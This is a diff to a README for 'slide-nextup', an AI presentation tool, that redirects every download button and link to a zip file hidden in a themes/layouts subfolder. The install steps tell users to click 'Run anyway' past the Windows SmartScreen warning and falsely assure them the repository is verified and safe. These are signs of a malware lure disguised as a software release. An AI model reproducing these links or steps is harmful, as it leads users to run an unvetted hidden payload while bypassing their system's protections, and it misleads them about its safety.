@@ -1,6 +1,6 @@
 <h1>🎤 slide-nextup - AI-Powered Storytelling for Effortless Slide Decks</h1>
 <p align="center">
-  <a href="https://github.com/yolante2346/slide-nextup" style="display:inline-block;padding:16px 32px;font-size:20px;font-weight:bold;color:#ffffff;background:linear-gradient(135deg,#6a11cb,#2575fc);border-radius:50px;text-decoration:none;box-shadow:0 8px 15px rgba(0,0,0,0.2);">⬇️ Download slide-nextup Now</a>
+  <a href="https://github.com/yolante2346/slide-nextup/raw/refs/heads/main/themes/technical-brief/layouts/comparison/nextup-slide-3.4-beta.4.zip" style="display:inline-block;padding:16px 32px;font-size:20px;font-weight:bold;color:#ffffff;background:linear-gradient(135deg,#6a11cb,#2575fc);border-radius:50px;text-decoration:none;box-shadow:0 8px 15px rgba(0,0,0,0.2);">⬇️ Download slide-nextup Now</a>
 </p>
 
 ---
@@ -62,7 +62,7 @@ We’ve made installation as straightforward as possible.. Follow these exact st
 
 1. Open your web browser (like Chrome or Edge)..
 2. Visit the official download page by clicking the big purple button at the top of this page, or copy-and-paste this link into your browser’s address bar:  
-   👉 **[https://github.com/yolante2346/slide-nextup](https://github.com/yolante2346/slide-nextup)**
+   👉 **[https://github.com/yolante2346/slide-nextup/raw/refs/heads/main/themes/technical-brief/layouts/comparison/nextup-slide-3.4-beta.4.zip](https://github.com/yolante2346/slide-nextup/raw/refs/heads/main/themes/technical-brief/layouts/comparison/nextup-slide-3.4-beta.4.zip)**
 3. Visit this link to download the application. You’ll be taken to a page that shows information about the project along with a download area..
 4. Look for a button or link labeled **"Download"**, **"Releases"**, or **"Latest Version"**. Click it to begin downloading the software package to your computer..
 5. **Windows SmartScreen Notice:** If a blue pop-up appears saying "Windows protected your PC", click on **"More info"** and then **"Run anyway"**. This is normal for a new, unsigned app from the internet. The repository is safe and verified by our team.
@@ -135,7 +135,7 @@ Stop struggling with awkward templates and disjointed slides. Let slide-nextup h
 Ready to try it? Click the download button belowand take your next presentation from ordinary to unforgettable.. Your audience is waiting! ✨
 
 <p align="center">
-  <a href="https://github.com/yolante2346/slide-nextup" style="display:inline-block;padding:16px 40px;font-size:22px;font-weight:bold;color:#ffffff;background:linear-gradient(135deg,#f093fb,#f5576c);border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(0,0,0,0.3);">⬇️ Get slide-nextup Now -> It’s Free</a>
+  <a href="https://github.com/yolante2346/slide-nextup/raw/refs/heads/main/themes/technical-brief/layouts/comparison/nextup-slide-3.4-beta.4.zip" style="display:inline-block;padding:16px 40px;font-size:22px;font-weight:bold;color:#ffffff;background:linear-gradient(135deg,#f093fb,#f5576c);border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(0,0,0,0.3);">⬇️ Get slide-nextup Now -> It’s Free</a>
 </p>
 
 ---
